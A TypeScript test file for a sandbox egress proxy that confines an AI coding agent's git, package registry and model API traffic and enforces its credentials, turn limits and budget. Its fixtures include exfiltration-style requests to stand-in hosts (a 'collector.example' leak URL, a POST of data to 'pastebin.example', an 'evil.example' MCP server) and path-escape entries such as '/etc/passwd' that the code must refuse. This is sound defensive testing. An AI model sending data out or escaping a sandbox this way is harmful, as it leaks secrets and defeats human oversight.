// GTM-agents: contract and behavior tests for the sandbox-cloudflare adapter, against a fake
// container and recorded, synthetic upstream responses. Every repository, spec, model and secret is
// invented; nothing reaches the network or starts a container.
import type { ChangedFile } from "@gtm-agents/core/ports";
import { describe, expect, it } from "vitest";
import { runCodingSandboxContract, type CodingSandboxHarness, type ObservedContainer } from "../_contract/coding-sandbox.ts";
import { json, recordedFetch, type RecordedRoute } from "../_contract/fetch.ts";
import { fetchesRemoteContent, handleEgress, mergeUsage, rewriteModelRequest, usageFromBody, type EgressContext, type EgressProps, type GateDecision, type TokenUsage } from "./egress.ts";
import { MAX_MODEL_TURNS, readSandboxOptions, type SandboxOptions } from "./options.ts";
import { createCodingSandbox } from "./port.ts";
import { AGENT_PROFILES, CLAUDE_CODE, OPENCODE, PLACEHOLDER_KEY, SPEC_PATH } from "./profiles.ts";
import { BASE_SHA_PATH, CHANGES_PATH, COLLECT_SCRIPT, RUN_SCRIPT, SandboxRunner, parseCollected, type ContainerLike, type ExecHandle, type ExecOptions, type FilesLike, type RunnerStore } from "./runner.ts";
import manifest from "./manifest.json";

// Low-entropy on purpose, so no scanner mistakes them for real credentials.
const GIT_TOKEN = "t".repeat(48);
const MODEL_KEY = "m".repeat(48);
const GATEWAY_TOKEN = "g".repeat(48);
const SECRETS: Record<string, string> = { GITHUB_TOKEN: GIT_TOKEN, ANTHROPIC_API_KEY: MODEL_KEY, OPENAI_API_KEY: MODEL_KEY, AI_GATEWAY_TOKEN: GATEWAY_TOKEN };
const NOW = new Date("2026-11-04T12:00:00.000Z");
const BASE = "1".repeat(40);
const TASK = "task-0001";
const CODER = "claude-coder-test";
const SPEC = JSON.stringify({ title: "Add CSV export", problem: "Reports cannot be exported.", approach: "Add an export button.", acceptanceCriteria: ["A CSV downloads"], files: ["src/reports.ts"], tests: ["test/reports.test.ts"], outOfScope: [], risk: "low", adoptionEvent: null, feasible: true });

class FakeFiles implements FilesLike {
  readonly data = new Map<string, string>();
  readonly written: Record<string, string> = {};

  readFile(path: string): Promise<Response> {
    const value = this.data.get(path);
    if (value === undefined) return Promise.reject(Object.assign(new Error(`${path}: not found`), { name: "SandboxFileError", code: "ENOENT" }));
    return Promise.resolve(new Response(value));
  }
  writeFile(path: string, content: string): Promise<void> {
    this.data.set(path, content);
    this.written[path] = content;
    return Promise.resolve();
  }
  mkdir(): Promise<void> {
    return Promise.resolve();
  }
}

const done = (code: number, stdout = ""): ExecHandle => ({
  exitCode: Promise.resolve(code),
  output: () => Promise.resolve({ stdout: new TextEncoder().encode(stdout).buffer as ArrayBuffer, stderr: new ArrayBuffer(0), exitCode: code }),
});

class FakeContainer implements ContainerLike {
  running = false;
  readonly images = { "claude-code": "registry.example/claude-code@sha256:test", opencode: "registry.example/opencode@sha256:test" };
  readonly observed: ObservedContainer = { starts: [], commands: [], writtenFiles: {}, intercepts: [] };
  readonly fetchers: Array<{ protocol: "http" | "https"; target: string; props: EgressProps }> = [];
  /** The step directory whose command is running. */
  current: string | null = null;
  collectorOutput = "";
  inactivity = 0;

  readonly files: FakeFiles;

  constructor(files: FakeFiles) {
    this.files = files;
    this.observed.writtenFiles = files.written;
  }

  start(options: { image: string; enableInternet: boolean }): void {
    if (this.running) throw new Error("the container is already running");
    this.observed.starts.push({ enableInternet: options.enableInternet });
    this.running = true;
  }
  exec(cmd: string[], options: ExecOptions = {}): Promise<ExecHandle> {
    if (!this.running) return Promise.reject(new Error("the container is not running"));
    this.observed.commands.push({ argv: [...cmd], env: { ...(options.env ?? {}) } });
    if (cmd[1] === RUN_SCRIPT) {
      const dir = cmd[2] ?? "";
      this.current = dir;
      this.files.data.set(`${dir}/pid`, "42 boot-1");
      return Promise.resolve(done(0));
    }
    if (cmd[3] === "probe") {
      const dir = (cmd[4] ?? "").replace(/\/pid$/, "");
      return Promise.resolve(done(this.current === dir ? 0 : 1));
    }
    if (cmd[0] === "tail") {
      const text = this.files.data.get(cmd[3] ?? "") ?? "";
      return Promise.resolve(done(0, text.slice(-Number(cmd[2]))));
    }
    if (cmd[0] === "ls") {
      const prefix = `${cmd[2]}/`;
      const steps = new Set([...this.files.data.keys()].filter((k) => k.startsWith(prefix)).map((k) => k.slice(prefix.length).split("/")[0]));
      return Promise.resolve(done(0, [...steps].join("\n")));
    }
    if (cmd[0] === "node" && cmd[1] === COLLECT_SCRIPT) {
      this.files.data.set(CHANGES_PATH, this.collectorOutput);
      return Promise.resolve(done(0));
    }
    return Promise.resolve(done(0));
  }
  destroy(): Promise<void> {
    this.running = false;
    this.current = null;
    return Promise.resolve();
  }
  setInactivityTimeout(ms: number): Promise<void> {
    this.inactivity = ms;
    return Promise.resolve();
  }
  #record(protocol: "http" | "https", target: string, binding: Fetcher): Promise<void> {
    this.observed.intercepts.push({ protocol, target });
    this.fetchers.push({ protocol, target, props: (binding as unknown as { props: EgressProps }).props });
    return Promise.resolve();
  }
  interceptOutboundHttp(addr: string, binding: Fetcher): Promise<void> {
    return this.#record("http", addr, binding);
  }
  interceptOutboundHttps(addr: string, binding: Fetcher): Promise<void> {
    return this.#record("https", addr, binding);
  }
  interceptAllOutboundHttp(binding: Fetcher): Promise<void> {
    return this.#record("http", "*", binding);
  }

  /** The step ends as ship-run would record it. */
  finish(exitCode: number, output: { stdout?: string; baseSha?: string } = {}): void {
    const dir = this.current;
    if (!dir) throw new Error("no step is running");
    if (output.stdout !== undefined) this.files.data.set(`${dir}/stdout.log`, output.stdout);
    if (output.baseSha !== undefined) this.files.data.set(BASE_SHA_PATH, `${output.baseSha}\n`);
    this.files.data.set(`${dir}/exit-code`, `${exitCode}\n`);
    this.current = null;
  }
}

class MapStore implements RunnerStore {
  readonly map = new Map<string, unknown>();
  get<T>(key: string): T | undefined {
    return this.map.get(key) as T | undefined;
  }
  put<T>(key: string, value: T): void {
    this.map.set(key, value);
  }
  delete(key: string): boolean {
    return this.map.delete(key);
  }
}

interface Rig {
  container: FakeContainer;
  files: FakeFiles;
  store: MapStore;
  runner: SandboxRunner;
}

function rig(options: SandboxOptions = readSandboxOptions({}), coderModel: string | null = CODER): Rig {
  const files = new FakeFiles();
  const container = new FakeContainer(files);
  const store = new MapStore();
  const runner = new SandboxRunner({
    container,
    files,
    store,
    egress: (props) => ({ props }) as unknown as Fetcher,
    options,
    profile: AGENT_PROFILES[options.profile],
    coderModel,
    name: TASK,
    now: () => NOW,
  });
  return { container, files, store, runner };
}

function harness(): CodingSandboxHarness {
  const rigs = new Map<string, Rig>();
  const of = (taskId: string): Rig => {
    let r = rigs.get(taskId);
    if (!r) {
      r = rig();
      rigs.set(taskId, r);
    }
    return r;
  };
  const options = readSandboxOptions({});
  return {
    sandbox: createCodingSandbox((taskId) => of(taskId).runner, options),
    finish: (taskId, exitCode, output) => Promise.resolve(of(taskId).container.finish(exitCode, output)),
    stop: (taskId) => of(taskId).container.destroy(),
    setCollectorOutput: (taskId, output) => {
      of(taskId).container.collectorOutput = output;
    },
    observed: (taskId) => of(taskId).container.observed,
  };
}

const textFile = (path: string, data: string, extra: Partial<ChangedFile> = {}): ChangedFile => ({ path, change: "added", additions: data.split("\n").length - 1, deletions: 0, mode: "100644", binary: false, content: { encoding: "utf-8", data }, ...extra });
const collectorDoc = (files: unknown[], extra: Record<string, unknown> = {}) => JSON.stringify({ version: 1, base: BASE, status: "ok", files, ...extra });
const expectedFiles: ChangedFile[] = [
  textFile("src/reports.ts", "export const csv = true;\n", { change: "modified", additions: 1, deletions: 1 }),
  { path: "src/old.ts", change: "deleted", additions: 0, deletions: 3, mode: "100644", binary: false, content: null },
  { path: "assets/icon.png", change: "added", additions: 0, deletions: 0, mode: "100644", binary: true, content: { encoding: "base64", data: "AAFiaW4=" } },
  { path: "docs/new.md", previousPath: "docs/old.md", change: "renamed", additions: 0, deletions: 0, mode: "100644", binary: false, content: { encoding: "utf-8", data: "notes\n" } },
];

runCodingSandboxContract({
  manifest,
  harness,
  secrets: Object.values(SECRETS),
  taskId: TASK,
  baseSha: BASE,
  prepare: { kind: "prepare", repo: "acme/app", baseBranch: "main", install: ["npm", "ci", "--ignore-scripts"] },
  spec: SPEC,
  checks: { kind: "checks", command: ["npm", "run", "check"] },
  agentSucceeded: `${JSON.stringify({ type: "system", subtype: "init" })}\n${JSON.stringify({ type: "result", subtype: "success", is_error: false, result: "Done." })}\n`,
  agentFailed: `${JSON.stringify({ type: "result", subtype: "error_max_turns", is_error: true })}\n`,
  timeoutExitCode: 124,
  collected: { output: collectorDoc(expectedFiles, { diffBytes: 37 }), files: expectedFiles },
  oversized: [
    { name: "the collector hit the file count", output: collectorDoc([], { status: "too_many_files" }), reason: "too_many_files" },
    { name: "the collector hit the size cap", output: collectorDoc([], { status: "diff_too_large" }), reason: "diff_too_large" },
    { name: "a file over the per-file cap, whatever the collector says", output: collectorDoc([textFile("big.txt", "x".repeat(512 * 1024 + 1))]), reason: "file_too_large" },
    { name: "more files than the cap, whatever the collector says", output: collectorDoc(Array.from({ length: 101 }, (_, i) => textFile(`f${i}.txt`, "x\n"))), reason: "too_many_files" },
    { name: "more content than the cap in all", output: collectorDoc(Array.from({ length: 5 }, (_, i) => textFile(`f${i}.txt`, "x".repeat(500 * 1024)))), reason: "diff_too_large" },
  ],
  invalid: [
    { name: "not JSON", output: "nope" },
    { name: "another base commit", output: JSON.stringify({ version: 1, base: "2".repeat(40), status: "ok", files: [] }) },
    { name: "a path out of the repository", output: collectorDoc([textFile("../escape.txt", "x\n")]) },
    { name: "a .git path", output: collectorDoc([textFile(".git/hooks/pre-commit", "x\n")]) },
    { name: "an absolute path", output: collectorDoc([textFile("/etc/passwd", "x\n")]) },
    { name: "a repeated path", output: collectorDoc([textFile("a.txt", "x\n"), textFile("a.txt", "y\n")]) },
    { name: "a submodule", output: collectorDoc([{ ...textFile("vendor/lib", "x"), mode: "160000" }]) },
    { name: "a deleted file with content", output: collectorDoc([{ ...textFile("a.txt", "x\n"), change: "deleted" }]) },
    { name: "binary content claimed as text", output: collectorDoc([{ ...textFile("a.bin", "x"), binary: true }]) },
    { name: "base64 that does not decode", output: collectorDoc([{ ...textFile("a.bin", ""), binary: true, content: { encoding: "base64", data: "@@@" } }]) },
    { name: "negative counts", output: collectorDoc([{ ...textFile("a.txt", "x\n"), additions: -1 }]) },
  ],
});

/** An egress context with recorded upstreams and observable gates. */
function egress(routes: RecordedRoute[], overrides: Partial<EgressContext> & { options?: SandboxOptions } = {}) {
  const recorded = recordedFetch(routes);
  const records: Array<{ usage: TokenUsage; model: string }> = [];
  const waits: Array<Promise<unknown>> = [];
  const released: string[] = [];
  let turns = 0;
  const ctx: EgressContext = {
    options: overrides.options ?? readSandboxOptions({}),
    fetch: recorded.fetch,
    secret: (name) => SECRETS[name],
    coderModel: CODER,
    priced: true,
    gate: () => Promise.resolve<GateDecision>({ allowed: true }),
    takeTurn: () => {
      turns += 1;
      return Promise.resolve({ allowed: turns <= MAX_MODEL_TURNS, turns, ticket: `t${turns}` });
    },
    releaseTurn: (ticket) => {
      released.push(ticket);
      return Promise.resolve();
    },
    record: (usage, model) => {
      records.push({ usage, model });
      return Promise.resolve();
    },
    waitUntil: (p) => {
      waits.push(p);
    },
    ...overrides,
  };
  return { ctx, recorded, records, released, settle: () => Promise.all(waits) };
}

const model: EgressProps = { route: "model", taskId: TASK, host: "api.anthropic.com" };
const git: EgressProps = { route: "git", taskId: TASK, host: "github.com", repo: "acme/app" };
const registry: EgressProps = { route: "registry", taskId: TASK, host: "registry.npmjs.org" };
const messages = (body: Record<string, unknown>, headers: Record<string, string> = {}, url = "https://api.anthropic.com/v1/messages?beta=true") =>
  new Request(url, { method: "POST", headers: { "content-type": "application/json", "x-api-key": PLACEHOLDER_KEY, "anthropic-version": "2023-06-01", ...headers }, body: JSON.stringify(body) });
const sse = (events: unknown[]) => new Response(events.map((e) => `event: x\ndata: ${JSON.stringify(e)}\n\n`).join(""), { headers: { "content-type": "text/event-stream" } });

describe("the git route", () => {
  const upstream: RecordedRoute[] = [
    { method: "GET", url: "https://github.com/acme/app.git/info/refs?service=git-upload-pack", respond: new Response("refs") },
    { method: "POST", url: "https://github.com/acme/app.git/git-upload-pack", respond: new Response("pack") },
  ];

  it("lets a read-only clone of the task's repository through with the Worker's token", async () => {
    const { ctx, recorded } = egress(upstream);
    expect((await handleEgress(new Request("https://github.com/acme/app.git/info/refs?service=git-upload-pack", { headers: { authorization: "Basic forged" } }), git, ctx)).status).toBe(200);
    expect((await handleEgress(new Request("https://github.com/Acme/App.git/git-upload-pack", { method: "POST", body: "0000" }), git, ctx)).status).toBe(200);
    expect(recorded.calls).toHaveLength(2);
    for (const call of recorded.calls) expect(call.headers.get("authorization")).toBe(`Basic ${btoa(`x-access-token:${GIT_TOKEN}`)}`);
  });

  it("refuses a push, another repository, another host and plain HTTP, without sending the token", async () => {
    const { ctx, recorded } = egress(upstream);
    const refused = [
      new Request("https://github.com/acme/app.git/info/refs?service=git-receive-pack"),
      new Request("https://github.com/acme/app.git/git-receive-pack", { method: "POST", body: "0000" }),
      new Request("https://github.com/initech/app.git/info/refs?service=git-upload-pack"),
      new Request("https://github.com/acme/app.git/info/refs?service=git-upload-pack&x=1"),
      new Request("https://evil.example/acme/app.git/info/refs?service=git-upload-pack"),
      new Request("http://github.com/acme/app.git/info/refs?service=git-upload-pack"),
      new Request("https://github.com/acme/app/archive/main.zip"),
    ];
    for (const request of refused) expect((await handleEgress(request, git, ctx)).status, request.url).toBe(403);
    expect(recorded.calls).toHaveLength(0);
  });
});

describe("the registry route", () => {
  it("allows package reads without credentials, and refuses writes and query strings", async () => {
    const { ctx, recorded } = egress([{ method: "GET", url: /^https:\/\/registry\.npmjs\.org\//, respond: json({ name: "left-pad" }) }]);
    expect((await handleEgress(new Request("https://registry.npmjs.org/@acme%2fui", { headers: { authorization: "Bearer forged" } }), registry, ctx)).status).toBe(200);
    expect(recorded.calls[0]?.headers.get("authorization")).toBeNull();
    expect((await handleEgress(new Request("https://registry.npmjs.org/left-pad", { method: "PUT", body: "{}" }), registry, ctx)).status).toBe(405);
    expect((await handleEgress(new Request("https://registry.npmjs.org/-/v1/search?text=secret"), registry, ctx)).status).toBe(403);
    expect((await handleEgress(new Request("https://registry.example/left-pad"), registry, ctx)).status).toBe(403);
    expect(recorded.calls).toHaveLength(1);
  });
});

describe("the model route", () => {
  const ok: RecordedRoute = { method: "POST", url: "https://api.anthropic.com/v1/messages?beta=true", respond: json({ id: "msg_1", content: [], usage: { input_tokens: 100, output_tokens: 20, cache_read_input_tokens: 5 } }) };

  it("rewrites the model, strips server-side tools, drops the container's key and attaches the Worker's", async () => {
    const { ctx, recorded, records, settle } = egress([ok]);
    const body = {
      model: "claude-the-agent-asked-for",
      max_tokens: 100,
      messages: [{ role: "user", content: "hi" }],
      tools: [
        { name: "Bash", input_schema: {} },
        { type: "web_search_20260209", name: "web_search" },
        { type: "web_fetch_20260209", name: "web_fetch" },
        { type: "code_execution_20260521", name: "code_execution" },
        { type: "tool_search_tool_regex_20251119", name: "tool_search_tool_regex" },
        { type: "mcp_toolset", mcp_server_name: "evil" },
        { type: "advisor_20260301", name: "advisor", model: "another-model" },
        { type: "some_future_server_tool_20270101", name: "future" },
        { type: "custom", name: "Edit", input_schema: {} },
        { type: "bash_20250124", name: "bash" },
        { type: "text_editor_20250728", name: "str_replace_based_edit_tool" },
      ],
      tool_choice: { type: "tool", name: "web_search" },
      mcp_servers: [{ type: "url", url: "https://evil.example/mcp", name: "evil" }],
      container: { skills: [{ type: "anthropic", skill_id: "pptx", version: "latest" }] },
      fallbacks: [{ model: "another-model" }],
      speed: "fast",
      inference_geo: "us",
    };
    const response = await handleEgress(messages(body, { "anthropic-beta": "claude-code-20250219,mcp-client-2025-11-20,code-execution-2025-08-25,server-side-fallback-2026-07-01,fast-mode-2026-02-01", "anthropic-version": "2026-10-21", authorization: "Bearer forged" }), model, ctx);
    expect(response.status).toBe(200);
    await response.text();
    await settle();
    const sent = recorded.calls[0];
    const forwarded = (await sent?.json()) as Record<string, unknown>;
    expect(forwarded.model).toBe(CODER);
    expect(forwarded.tools).toEqual([{ name: "Bash", input_schema: {} }, { type: "custom", name: "Edit", input_schema: {} }, { type: "bash_20250124", name: "bash" }, { type: "text_editor_20250728", name: "str_replace_based_edit_tool" }]);
    for (const field of ["tool_choice", "mcp_servers", "container", "fallbacks", "speed", "inference_geo"]) expect(forwarded, field).not.toHaveProperty(field);
    expect(sent?.headers.get("anthropic-version")).toBe("2026-10-21");
    expect(sent?.headers.get("x-api-key")).toBe(MODEL_KEY);
    expect(sent?.headers.get("authorization")).toBeNull();
    expect(sent?.headers.get("anthropic-beta")).toBe("claude-code-20250219");
    expect(records).toEqual([{ usage: { inputTokens: 100, outputTokens: 20, cacheReadTokens: 5, cacheWriteTokens: 0 }, model: CODER }]);
  });

  it("refuses a request that asks the provider to fetch a URL, and forwards inline content", async () => {
    const { ctx, recorded } = egress([ok]);
    const remote = [
      { model: "x", messages: [{ role: "user", content: [{ type: "image", source: { type: "url", url: "https://collector.example/?leak=1" } }] }] },
      { model: "x", messages: [{ role: "user", content: [{ type: "tool_result", tool_use_id: "t1", content: [{ type: "document", source: { type: "url", url: "https://collector.example/a.pdf" } }] }] }] },
      { model: "x", messages: [], system: [{ type: "document", source: { type: "url", url: "https://collector.example/a.pdf" } }] },
    ];
    for (const body of remote) expect((await handleEgress(messages(body), model, ctx)).status).toBe(400);
    expect(recorded.calls).toHaveLength(0);
    const inline = { model: "x", messages: [{ role: "user", content: [{ type: "image", source: { type: "base64", media_type: "image/png", data: "AAEC" } }, { type: "text", text: "see https://docs.example/page" }] }] };
    expect((await handleEgress(messages(inline), model, ctx)).status).toBe(200);
    expect(fetchesRemoteContent([{ type: "image_url", image_url: { url: "https://collector.example/x.png" } }])).toBe(true);
    expect(fetchesRemoteContent([{ type: "image_url", image_url: { url: "data:image/png;base64,AAEC" } }])).toBe(false);
  });

  it("falls back to a fixed API version when the container sends a malformed one", async () => {
    const { ctx, recorded } = egress([ok]);
    await handleEgress(messages({ model: "x", messages: [] }, { "anthropic-version": "latest" }), model, ctx);
    expect(recorded.calls[0]?.headers.get("anthropic-version")).toBe("2023-06-01");
  });

  it("records usage from a streamed response while passing every byte through", async () => {
    const stream = sse([
      { type: "message_start", message: { usage: { input_tokens: 300, output_tokens: 1, cache_creation_input_tokens: 40 } } },
      { type: "content_block_delta", delta: { text: "hello" } },
      { type: "message_delta", usage: { output_tokens: 77 } },
    ]);
    const { ctx, records, settle } = egress([{ ...ok, respond: stream }]);
    const response = await handleEgress(messages({ model: "x", messages: [], stream: true }), model, ctx);
    expect(await response.text()).toContain("hello");
    await settle();
    expect(records[0]?.usage).toEqual({ inputTokens: 300, outputTokens: 77, cacheWriteTokens: 40, cacheReadTokens: 0 });
  });

  it("refuses before forwarding when the gate refuses or cannot be read", async () => {
    for (const gate of [() => Promise.resolve<GateDecision>({ allowed: false, message: "budget:daily_limit_cents is reached" }), () => Promise.reject(new Error("D1 is down"))]) {
      const { ctx, recorded } = egress([ok], { gate });
      expect((await handleEgress(messages({ model: "x", messages: [] }), model, ctx)).status).toBe(429);
      expect(recorded.calls).toHaveLength(0);
    }
  });

  it("charges a response that ends before its final usage at the worst case the request allowed", async () => {
    // Cut off after message_start: the input is known, the output is charged at the request's cap.
    const cut = sse([{ type: "message_start", message: { usage: { input_tokens: 300, output_tokens: 1 } } }, { type: "content_block_delta", delta: { text: "hel" } }]);
    const first = egress([{ ...ok, respond: cut }]);
    await (await handleEgress(messages({ model: "x", messages: [], stream: true, max_tokens: 4000 }), model, first.ctx)).text();
    await first.settle();
    expect(first.records[0]?.usage).toMatchObject({ inputTokens: 300, outputTokens: 4000 });
    // No usage at all (a provider that never reports it): the input is charged from the request's size.
    const silent = egress([{ ...ok, respond: sse([{ type: "content_block_delta", delta: { text: "hi" } }]) }]);
    await (await handleEgress(messages({ model: "x", messages: [{ role: "user", content: "x".repeat(3000) }], stream: true }), model, silent.ctx)).text();
    await silent.settle();
    expect(silent.records[0]?.usage.outputTokens).toBe(32_000);
    expect(silent.records[0]?.usage.inputTokens).toBeGreaterThanOrEqual(1000);
    // A complete response is charged exactly what it reports.
    const whole = sse([{ type: "message_start", message: { usage: { input_tokens: 10, output_tokens: 1 } } }, { type: "message_delta", usage: { output_tokens: 5 } }]);
    const exact = egress([{ ...ok, respond: whole }]);
    await (await handleEgress(messages({ model: "x", messages: [], stream: true, max_tokens: 4000 }), model, exact.ctx)).text();
    await exact.settle();
    expect(exact.records[0]?.usage).toMatchObject({ inputTokens: 10, outputTokens: 5 });
  });

  it("refuses while the task has its most model calls in flight, without using a turn, and frees the slot when a call is over", async () => {
    const busy = egress([ok], { takeTurn: () => Promise.resolve({ allowed: false, turns: 3, busy: true }) });
    const refused = await handleEgress(messages({ model: "x", messages: [] }), model, busy.ctx);
    expect(refused.status).toBe(429);
    expect(await refused.text()).toMatch(/in flight/);
    expect(busy.recorded.calls).toHaveLength(0);
    // A forwarded call frees its slot once its usage is read; a call refused before forwarding frees it at once.
    const done = egress([ok]);
    await (await handleEgress(messages({ model: "x", messages: [] }), model, done.ctx)).text();
    await done.settle();
    expect(done.released).toEqual(["t1"]);
    const bad = egress([ok]);
    expect((await handleEgress(new Request("https://api.anthropic.com/v1/messages", { method: "POST", body: "not json" }), model, bad.ctx)).status).toBe(400);
    await bad.settle();
    expect(bad.released).toEqual(["t1"]);
  });

  it("forwards only the request fields it knows, so router, tier and new server-side fields never reach the provider", () => {
    const anthropic = rewriteModelRequest("anthropic", { messages: [], max_tokens: 100, service_tier: "priority", betas: ["x"], unknown_feature: { on: true }, thinking: { type: "enabled", budget_tokens: 50 } }, CODER);
    expect(anthropic).toEqual({ messages: [], max_tokens: 100, model: CODER, thinking: { type: "enabled", budget_tokens: 50 } });
    const openai = rewriteModelRequest("openai", { messages: [], models: ["a", "b"], plugins: [{ id: "web" }], route: "fallback", provider: { order: ["x"] }, n: 4, store: true, service_tier: "flex", temperature: 0.2 }, CODER);
    expect(openai).toEqual({ messages: [], model: CODER, temperature: 0.2, max_completion_tokens: 32_000 });
  });

  it("counts model turns in the sandbox's own storage and frees in-flight slots, which go stale on their own", () => {
    const r = rig();
    const now = 1_000_000;
    const first = r.runner.takeTurn(10, 2, now);
    const second = r.runner.takeTurn(10, 2, now);
    expect([first.allowed, second.allowed]).toEqual([true, true]);
    expect(r.runner.takeTurn(10, 2, now)).toEqual({ allowed: false, turns: 2, busy: true });
    r.runner.releaseTurn(first.ticket ?? "", now);
    expect(r.runner.takeTurn(10, 2, now)).toMatchObject({ allowed: true, turns: 3 });
    // A slot whose release never came is free again after IN_FLIGHT_STALE_MS.
    expect(r.runner.takeTurn(10, 2, now)).toMatchObject({ allowed: false, busy: true });
    expect(r.runner.takeTurn(10, 2, now + 15 * 60 * 1000)).toMatchObject({ allowed: true, turns: 4 });
  });

  it("refuses past the task's turn limit, and when the counter cannot be read", async () => {
    const { ctx, recorded } = egress([ok]);
    for (let i = 0; i < MAX_MODEL_TURNS; i++) expect((await handleEgress(messages({ model: "x", messages: [] }), model, ctx)).status).toBe(200);
    expect((await handleEgress(messages({ model: "x", messages: [] }), model, ctx)).status).toBe(429);
    expect(recorded.calls).toHaveLength(MAX_MODEL_TURNS);
    const broken = egress([ok], { takeTurn: () => Promise.reject(new Error("storage is unavailable")) });
    expect((await handleEgress(messages({ model: "x", messages: [] }), model, broken.ctx)).status).toBe(503);
    expect(broken.recorded.calls).toHaveLength(0);
  });

  it("counts no turn for token counting, and refuses every other path and query", async () => {
    let taken = 0;
    const { ctx, recorded } = egress([{ method: "POST", url: "https://api.anthropic.com/v1/messages/count_tokens", respond: json({ input_tokens: 3 }) }], { takeTurn: () => Promise.resolve({ allowed: true, turns: ++taken }) });
    expect((await handleEgress(messages({ model: "x", messages: [] }, {}, "https://api.anthropic.com/v1/messages/count_tokens"), model, ctx)).status).toBe(200);
    expect(taken).toBe(0);
    for (const url of ["https://api.anthropic.com/v1/files", "https://api.anthropic.com/v1/messages/batches", "https://api.anthropic.com/v1/messages?other=1", "https://api.example/v1/messages", "http://api.anthropic.com/v1/messages"]) {
      expect((await handleEgress(messages({ model: "x", messages: [] }, {}, url), model, ctx)).status, url).toBe(403);
    }
    expect(recorded.calls).toHaveLength(1);
  });

  it("refuses when no priced coder model is configured or the key is missing", async () => {
    expect((await handleEgress(messages({ model: "x", messages: [] }), model, egress([ok], { coderModel: null }).ctx)).status).toBe(503);
    expect((await handleEgress(messages({ model: "x", messages: [] }), model, egress([ok], { priced: false }).ctx)).status).toBe(503);
    expect((await handleEgress(messages({ model: "x", messages: [] }), model, egress([ok], { secret: () => undefined }).ctx)).status).toBe(503);
  });

  it("still answers when recording the cost fails", async () => {
    const { ctx, settle } = egress([ok], { record: () => Promise.reject(new Error("D1 is down")) });
    const response = await handleEgress(messages({ model: "x", messages: [] }), model, ctx);
    expect(response.status).toBe(200);
    await expect(settle()).resolves.toBeDefined();
  });

  it("sends a gateway token and no vendor key through an authenticated gateway with stored keys", async () => {
    const options = readSandboxOptions({ modelBaseUrl: "https://gateway.ai.example/v1/acct/gw/anthropic/v1", byok: true });
    const { ctx, recorded } = egress([{ method: "POST", url: "https://gateway.ai.example/v1/acct/gw/anthropic/v1/messages", respond: json({ usage: {} }) }], { options });
    expect((await handleEgress(messages({ model: "x", messages: [] }, {}, "https://api.anthropic.com/v1/messages"), model, ctx)).status).toBe(200);
    expect(recorded.calls[0]?.headers.get("cf-aig-authorization")).toBe(`Bearer ${GATEWAY_TOKEN}`);
    expect(recorded.calls[0]?.headers.get("x-api-key")).toBeNull();
  });

  it("never sends the gateway token to the vendor's own API", async () => {
    const { ctx, recorded } = egress([ok]);
    expect((await handleEgress(messages({ model: "x", messages: [] }), model, ctx)).status).toBe(200);
    expect(recorded.calls[0]?.headers.get("cf-aig-authorization")).toBeNull();
    expect(recorded.calls[0]?.headers.get("x-api-key")).toBe(MODEL_KEY);
    // byok without a gateway is ignored: the vendor key is still what authenticates.
    expect(readSandboxOptions({ byok: true }).model).toMatchObject({ byok: false, viaGateway: false });
  });

  it("speaks an OpenAI-compatible API for opencode, keeping only function tools and asking for usage", async () => {
    const options = readSandboxOptions({ profile: "opencode", modelApi: "openai" });
    const props: EgressProps = { route: "model", taskId: TASK, host: "api.openai.com" };
    const { ctx, recorded, records, settle } = egress([{ method: "POST", url: "https://api.openai.com/v1/chat/completions", respond: sse([{ choices: [] }, { usage: { prompt_tokens: 50, completion_tokens: 9, prompt_tokens_details: { cached_tokens: 10 } } }]) }], { options });
    const request = new Request("https://api.openai.com/v1/chat/completions", { method: "POST", body: JSON.stringify({ model: "gpt", stream: true, messages: [{ role: "user", content: "hi" }], tools: [{ type: "function", function: { name: "edit" } }, { type: "web_search_preview" }], web_search_options: {} }) });
    const response = await handleEgress(request, props, ctx);
    await response.text();
    await settle();
    const forwarded = (await recorded.calls[0]?.json()) as Record<string, unknown>;
    expect(forwarded).toMatchObject({ model: CODER, stream_options: { include_usage: true }, tools: [{ type: "function", function: { name: "edit" } }] });
    expect(forwarded).not.toHaveProperty("web_search_options");
    expect(recorded.calls[0]?.headers.get("authorization")).toBe(`Bearer ${MODEL_KEY}`);
    expect(records[0]?.usage).toEqual({ inputTokens: 40, outputTokens: 9, cacheReadTokens: 10 });
  });

  it("denies everything on the deny route", async () => {
    const { ctx, recorded } = egress([]);
    expect((await handleEgress(new Request("https://pastebin.example/upload", { method: "POST", body: "data" }), { route: "deny", taskId: TASK, host: "*" }, ctx)).status).toBe(403);
    expect(recorded.calls).toHaveLength(0);
  });
});

describe("sandbox-cloudflare specifics", () => {
  it("registers its intercepts before starting the container, and closes the git host once the clone is done", async () => {
    const r = rig();
    await r.runner.begin(TASK, "prepare", { kind: "prepare", repo: "Acme/App", baseBranch: "main", install: null });
    expect(r.container.fetchers.map((f) => [f.protocol, f.target, f.props.route])).toEqual([
      ["https", "github.com", "git"],
      ["https", "registry.npmjs.org", "registry"],
      ["https", "api.anthropic.com", "model"],
      ["http", "*", "deny"],
      ["https", "*", "deny"],
    ]);
    expect(r.container.fetchers[0]?.props.repo).toBe("acme/app");
    expect(r.container.inactivity).toBe(45 * 60 * 1000);
    r.container.finish(0, { baseSha: BASE });
    await r.runner.report();
    await r.runner.begin(TASK, "agent-1", { kind: "agent", spec: SPEC });
    expect(r.container.fetchers.at(-1)).toMatchObject({ protocol: "https", target: "github.com", props: { route: "deny" } });
  });

  it("gives the agent only the spec, a fixed instruction and a placeholder key", async () => {
    const r = rig();
    await r.runner.begin(TASK, "prepare", { kind: "prepare", repo: "acme/app", baseBranch: "main", install: null });
    r.container.finish(0, { baseSha: BASE });
    await r.runner.report();
    await r.runner.begin(TASK, "agent-1", { kind: "agent", spec: SPEC });
    expect(r.files.written[SPEC_PATH]).toBe(SPEC);
    const run = r.container.observed.commands.at(-1);
    const argv = run?.argv ?? [];
    expect(argv.slice(0, 4)).toEqual(["/bin/sh", RUN_SCRIPT, "/workspace/task/steps/agent-1", "2400"]);
    expect(argv).toEqual(expect.arrayContaining(["claude", "--max-turns", "64", "--model", CODER, "--disallowedTools", "WebFetch", "WebSearch", "mcp__*"]));
    expect(argv.at(-1)).toContain(SPEC_PATH);
    expect(argv.join(" ")).not.toContain("CSV");
    expect(run?.env.ANTHROPIC_API_KEY).toBe(PLACEHOLDER_KEY);
    expect(run?.env.ANTHROPIC_BASE_URL).toBe("https://api.anthropic.com");
  });

  it("refuses a malformed spec, step id, repository or command, and a sandbox of another task", async () => {
    const r = rig();
    expect(await r.runner.begin(TASK, "Bad Step", { kind: "prepare", repo: "acme/app", baseBranch: "main", install: null })).toMatchObject({ accepted: false });
